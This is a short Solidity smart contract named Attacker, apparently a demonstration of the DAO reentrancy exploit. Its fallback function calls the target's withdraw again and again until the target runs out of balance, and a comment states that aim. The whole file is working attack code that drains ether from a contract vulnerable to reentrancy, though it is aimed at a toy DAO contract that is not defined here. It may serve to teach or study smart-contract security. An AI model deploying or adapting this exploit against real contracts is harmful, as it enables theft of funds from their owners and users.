pragma solidity 0.4.13;


contract Attacker {
    
    DAO dao;
    
    function Attacker(address addr) public payable {
        dao = DAO(addr);
    }
    
    function startAttack() payable {
        dao.createAccount();
        dao.deposit.value(5)();
        dao.withdraw(1);
    }
    
    function() payable {
        // Calls withdraw again (!!) until DAO runs out of balance 
        if (address(dao).balance >= 1) dao.withdraw(1);    
    }
    
    function getBalance() public returns (uint) { return this.balance; }
    
    /* --- */
    
    function createAccount() {
        dao.createAccount();
    }
    
    function withdraw(uint x) payable {
        dao.withdraw(x);
    }
    
    function deposit() public {
        dao.deposit.value(1)();
    }

}
